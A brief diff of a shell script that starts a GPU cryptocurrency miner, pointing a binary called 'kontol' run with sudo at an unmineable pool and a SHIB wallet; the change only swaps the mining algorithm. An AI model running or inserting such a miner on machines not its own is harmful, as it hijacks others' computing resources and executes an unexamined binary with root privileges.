@@ -1,5 +1,5 @@
 POOL=rx-us.unmineable.com:80
 WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725
 WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
-ALGO=wrkzcoin
+ALGO=NinjaCoin
 sudo ./kontol --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
